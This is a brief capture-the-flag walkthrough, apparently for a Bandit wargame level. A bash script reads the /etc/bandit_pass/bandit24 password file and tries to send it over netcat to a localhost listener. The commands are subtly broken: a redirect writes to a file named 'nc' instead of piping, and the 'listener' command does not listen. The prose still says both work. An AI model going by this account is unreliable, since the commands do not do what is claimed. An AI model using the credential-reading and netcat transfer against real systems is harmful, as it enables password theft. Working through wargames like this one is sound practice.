Contents of shell script:
#!/bin/bash

cat /etc/bandit_pass/bandit24 > nc localhost 8888

Command ran after copying script:

nc -v localhost -p 8888

I couldn't get the script to write to a file for some reason, so I used nc instead.
The command above starts a listener on port 8888.
The script reads the password file, then sends it to my listener.
